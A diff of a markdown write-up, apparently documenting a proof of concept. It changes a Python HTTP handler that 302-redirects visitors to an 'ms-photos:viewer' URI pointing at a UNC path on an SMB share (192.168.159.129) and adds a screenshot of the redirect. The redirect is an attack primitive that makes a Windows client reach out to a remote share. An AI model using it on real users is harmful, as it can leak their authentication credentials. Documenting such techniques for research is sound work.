@@ -66,15 +66,24 @@ class RedirectHandler(BaseHTTPRequestHandler):
     def do_GET(self):
         if self.path == "/":
             self.send_response(302)  # HTTP 302 Found (temporary redirect)
-            self.send_header('Location', 'ms-photos:viewer?fileName=\\\\192.168.159.129\\share\\lapin.jpg')
+            self.send_header('Location', 'ms-photos:viewer?fileName=\\\\192.168.159.129\\share\\Capture.png')
             self.end_headers()
         else:
             self.send_response(404)
             self.end_headers()
             self.wfile.write(b"Not Found")
 ```
+<br>
+
+Redirection from client side:
 
 <br>
+<p align="center">
+  <img width="683" height="189" alt="image" src="https://github.com/user-attachments/assets/9b42632f-ac91-4e15-a8ff-59a8be8703b0" />
+</p>
+
+<br>
+
 
 #### Notes
 <br>
